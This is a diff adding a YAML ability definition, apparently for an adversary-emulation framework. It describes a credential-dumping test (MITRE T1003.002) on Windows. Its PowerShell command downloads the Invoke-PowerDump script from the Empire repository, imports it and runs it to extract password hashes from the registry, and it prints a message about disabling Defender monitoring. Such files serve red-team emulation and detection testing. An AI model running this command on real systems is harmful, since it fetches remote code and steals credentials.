@@ -1,0 +1,22 @@
+---
+- id: 3bcfa369fd1f214e4d05944228eeb212
+  name: PowerDump Hashes and Usernames from Registry
+  description: Executes a hashdump by reading the hashes from the registry.
+  tactic: credential-access
+  technique:
+    attack_id: T1003.002
+    name: 'OS Credential Dumping: Security Account Manager'
+  platforms:
+    windows:
+      psh:
+        command: if (Test-Path "PathToAtomicsFolder\..\ExternalPayloads\PowerDump.ps1")
+          { ; } else {New-Item -Type Directory "PathToAtomicsFolder\..\ExternalPayloads\"
+          -ErrorAction ignore -Force | Out-Null; Invoke-Webrequest -Uri "https://raw.githubusercontent.com/BC-SECURITY/Empire/c1bdbd0fdafd5bf34760d5b158dfd0db2bb19556/data/module_source/credentials/Invoke-PowerDump.ps1"
+          -UseBasicParsing -OutFile "PathToAtomicsFolder\..\ExternalPayloads\PowerDump.ps1"};  Write-Host
+          "STARTING TO SET BYPASS and DISABLE DEFENDER REALTIME MON" -fore green;
+          Import-Module "PathToAtomicsFolder\..\ExternalPayloads\PowerDump.ps1"; Invoke-PowerDump
+        payloads: []
+        cleanup: ''
+        parsers:
+          plugins.atomic.app.parsers.atomic_powershell:
+          - source: validate_me
